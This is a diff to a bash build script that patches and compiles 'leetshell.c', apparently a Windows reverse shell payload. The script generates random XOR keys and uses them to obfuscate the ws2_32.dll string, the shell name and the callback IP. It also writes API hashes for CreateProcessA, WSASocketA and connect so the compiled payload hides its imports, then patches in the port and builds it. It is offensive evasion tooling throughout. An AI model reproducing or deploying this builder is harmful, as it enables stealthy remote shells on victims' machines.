@@ -45,7 +45,7 @@ xor_hex2=$(printf '0x%02x' $xor_key2)
 xor_key3=$((RANDOM % 256))
 xor_hex3=$(printf '0x%02x' $xor_key3)
 
-# === Update KEY values defined in leetshell.c ===
+# === Update KEY values defined in src/leetshell.c ===
 sed -i "s/^#define KEY1.*/#define KEY1 $xor_hex1/" "$filename"
 sed -i "s/^#define KEY2.*/#define KEY2 $xor_hex2/" "$filename"
 sed -i "s/^#define KEY3.*/#define KEY3 $xor_hex3/" "$filename"
@@ -59,7 +59,6 @@ apis=(
   "CreateProcessA"
   "WSAStartup"
   "WSASocketA"
-  "inet_addr"
   "connect"
 )
 
@@ -83,16 +82,15 @@ for sym in "${apis[@]}"; do
   export "$sym"
 done
 
-# === Update SEED and HASH values defined in leetshell.c ===
+# === Update SEED and HASH values defined in src/leetshell.c ===
 sed -i "s/^#define SEED.*/#define SEED                $seed/" "$filename"
 sed -i "s/^#define LOADLIBRARYA_H.*/#define LOADLIBRARYA_H      $LoadLibraryA/" "$filename"
 sed -i "s/^#define CREATEPROCESSA_H.*/#define CREATEPROCESSA_H    $CreateProcessA/" "$filename"
 sed -i "s/^#define WSASTARTUP_H.*/#define WSASTARTUP_H        $WSAStartup/" "$filename"
 sed -i "s/^#define WSASOCKETA_H.*/#define WSASOCKETA_H        $WSASocketA/" "$filename"
-sed -i "s/^#define INET_ADDR_H.*/#define INET_ADDR_H         $inet_addr/" "$filename"
 sed -i "s/^#define CONNECT_H.*/#define CONNECT_H           $connect/" "$filename"
 
-# === Update ws2_32.dll string ===
+# === XOR encrypt ws2_32.dll string ===
 ws2="ws2_32.dll"
 encoded_ws2="{"
 for (( i=0; i<${#ws2}; i++ )); do
@@ -102,9 +100,22 @@ for (( i=0; i<${#ws2}; i++ )); do
 done
 encoded_ws2+=$(printf "0x%02x" $xor_key1)
 encoded_ws2+="}"
-sed -i "s/char ws2_32_dll\[\] = .*;/char ws2_32_dll[] = $encoded_ws2;/" "$filename"
 
-# === Encode and update shell string ===
+# === Format and XOR encrypt IP ====
+IFS=. read -r o0 o1 o2 o3 <<< "$ip" || { echo "Invalid IPv4: $ip" >&2; exit 1; }
+for o in "$o0" "$o1" "$o2" "$o3"; do
+  [[ "$o" =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || { echo "Invalid IPv4: $ip" >&2; exit 1; }
+done
+
+k=$(( xor_key2 & 0xFF ))
+b0=$(( (10#$o0 ^ k) & 0xFF ))
+b1=$(( (10#$o1 ^ k) & 0xFF ))
+b2=$(( (10#$o2 ^ k) & 0xFF ))
+b3=$(( (10#$o3 ^ k) & 0xFF ))
+
+printf -v ip_array "{0x%02x, 0x%02x, 0x%02x, 0x%02x, 0x%02x}" "$b0" "$b1" "$b2" "$b3" "$k"
+
+# === XOR encrypt shell string ===
 if [ "$shell_type" == "cmd" ]; then
   shell_str="cmd"
 else
@@ -114,31 +125,16 @@ fi
 encoded_shell="{"
 for (( i=0; i<${#shell_str}; i++ )); do
   byte=$(printf "%d" "'${shell_str:$i:1}")
-  xor_byte=$((byte ^ xor_key2))
+  xor_byte=$((byte ^ xor_key3))
   encoded_shell+=$(printf "0x%02x, " $xor_byte)
 done
-encoded_shell+=$(printf "0x%02x" $xor_key2)
+encoded_shell+=$(printf "0x%02x" $xor_key3)
 encoded_shell+="}"
+
+# === Patch the C source ===
 sed -i "s/char cmd\[\] = .*;/char cmd[] = $encoded_shell;/" "$filename"
-
-# === XOR encode IP ===
-result="{"
-for (( i=0; i<$len; i++ )); do
-  char=${ip:$i:1}
-  char_ord=$(printf '%d' "'$char")
-  xor_result=$((char_ord ^ xor_key3))
-  xor_char=$(printf '0x%02x' $xor_result)
-
-  if [ $i -eq $lastChar ]; then
-    result+="$xor_char"
-  else
-    result+="$xor_char,"
-  fi
-done
-result+=$(printf ", 0x%02x}" $xor_key3)
-
-# === patch IP and port ===
-sed -i "s/char ip\[\] = .*;/char ip[] = $result;/g" "$filename"
+sed -i "s/char ws2_32_dll\[\] = .*;/char ws2_32_dll[] = $encoded_ws2;/" "$filename"
+sed -i "s/unsigned char ip\[\] = .*;/unsigned char ip\[\] = $ip_array;/g" "$filename"
 sed -i "s/int port =.*;/int port = $port ;/g" "$filename"
 
 # === build payload ===
